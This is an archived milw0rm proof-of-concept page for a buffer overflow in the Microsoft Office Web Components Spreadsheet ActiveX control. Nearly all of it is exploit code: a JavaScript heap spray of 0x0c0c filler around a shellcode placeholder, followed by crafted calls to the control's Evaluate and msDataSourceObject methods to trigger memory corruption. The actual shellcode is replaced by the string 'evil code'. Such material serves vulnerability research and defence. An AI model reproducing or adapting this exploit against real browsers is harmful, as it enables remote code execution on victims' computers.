<html><head><title>Microsoft Office Web Components (Spreadsheet) ActiveX BOF PoC</title></head><pre>&lt;!-- http://en.securitylab.ru/poc/extra/382458.php --&gt;
&lt;html&gt;
&lt;body&gt;
&lt;script language=&quot;JavaScript&quot;&gt;
var shellcode = unescape(&quot;evil code&quot;);
var array = new Array();
var ls = 0x81000-(shellcode.length*2);
var bigblock = unescape(&quot;%u0b0c%u0b0C&quot;);
while(bigblock.length&lt;ls/2)
{bigblock+=bigblock;}
var lh = bigblock.substring(0,ls/2);
delete bigblock;
for(i=0;i&lt;0x99*2;i++) {
array[i] = lh + lh + shellcode;
}
CollectGarbage();
var obj = new ActiveXObject(&quot;OWC10.Spreadsheet&quot;);
e=new Array();
e.push(1);
e.push(2);
e.push(0);
e.push(window);
for(i=0;i&lt;e.length;i++){
for(j=0;j&lt;10;j++){
try{
obj.Evaluate(e[i]);
}
catch(e)
{}
}
}
window.status=e[3] +'';
for(j=0;j&lt;10;j++){
try{
obj.msDataSourceObject(e[3]);
}
catch(e)
{}
}
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt; 

# milw0rm.com [2009-07-16]</pre></html>